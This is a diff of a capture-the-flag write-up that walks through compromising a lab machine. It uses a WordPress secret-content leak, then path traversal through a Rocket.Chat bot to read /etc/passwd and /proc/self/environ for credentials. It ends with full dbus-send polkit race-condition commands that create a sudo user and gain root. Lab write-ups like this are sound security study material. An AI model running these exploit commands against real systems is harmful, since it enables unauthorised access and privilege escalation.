@@ -24,15 +24,17 @@ Acessing this site, we come across to an Wordpress blog. Goingo straight to the 
 The exploit says that if we insert `?static=1` to a wordpress URL, we can leak its secret content. Trying this...
 [static.png]
 
-It give us a secret link to registration to a chat system. Copy and paste the link, it take us to a registration page where we can simply create an account an enter to the chat. 
-[rocket_notloged.chat]
+It give us a secret link to registration to a chat system. So, add this another subdomain in the hosts file.
+[hosts_chat] --
+Copy and paste the link, it take us to a registration page where we can simply create an account an enter to the chat. 
+[rocket_notloged.chat] 
 [rocket_loged]
 
 Here we are introduced to a bot(recyclops) who can retrieve some informations to us, but we are going to use only two: "file" and "list" (`cat` and `ls` command respectively). We can use the bot by just going to chat in direct message and type "recyclops list", and it will list the files on the present directory. But there's a vulnerability here, if we type "recyclops file ../../../etc/passwd" it'll retrieve to us the file passwd. Great, now we just need to "leverage"!.
 [etc_passwd_bot.png]
 
 In this part I didn't know what to do after the LFI, so just googling i found a site which tells how to do it. The file /proc/self/environ has some informations of the environment of the process. Just type "recyclops ../../../proc/self/environ". We got it! Now we have the credentials of the user "dwight".
-[proc_self]
+[proc_self] 
 
 Now we can use SSH to connect to dwight termitnal. We in! 
 
@@ -47,7 +49,16 @@ In the user directory it has linpeas.sh tool, but it won't be so usefull. There'
 We're gonna use these payloads in sequence;
 
 ```
-dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:boris string:"Boris Ivanovich Grishenko" int32:1
+dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:boris string:"Boris Ivanovich Grishenko" int32:1 & sleep 0.008s ; kill $!
 ----------------------------------------------
-
+id boris --> verify if the user has been created
+----------------------------------------------
+openssl passwd -5 iaminvincible! --> create a hash for the password "iaminvincible!"
+----------------------------------------------
+dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1002 org.freedesktop.Accounts.User.SetPassword string:'$5$Fv2PqfurMmI879J7$ALSJ.w4KTP.mHrHxM2FYV3ueSipCf/QSfQUlATmWuuB' string:GoldenEye & sleep 0.008s ; kill $!
 ```
+
+Note that it may fails sometimes, it's normal, just persist. After run the commands above, just type `su - boris` and type the password, once loged in just type `sudo su`. And We Got It! Now submit the root flag and root the machine.
+[root.txt]
+
+--If you have any questions about the vulnerability exploit, visit the link that I left linked. 
